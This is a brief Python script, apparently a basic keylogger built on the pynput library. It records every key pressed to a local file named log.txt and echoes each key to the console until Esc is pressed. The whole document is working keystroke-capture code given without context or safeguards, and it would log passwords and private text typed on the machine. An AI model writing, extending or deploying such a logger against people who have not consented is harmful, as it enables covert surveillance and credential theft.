from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
    write_file(key)

    try:
        print('alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        print('special key {0} pressed'.format(key))


def write_file(key):
    with open('log.txt', 'a') as f:
        if hasattr(key, 'char') and key.char is not None:
            f.write(key.char)
        else:
            f.write(f' [{key}] ')


def on_release(key):
    print('{0} released'.format(key))
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
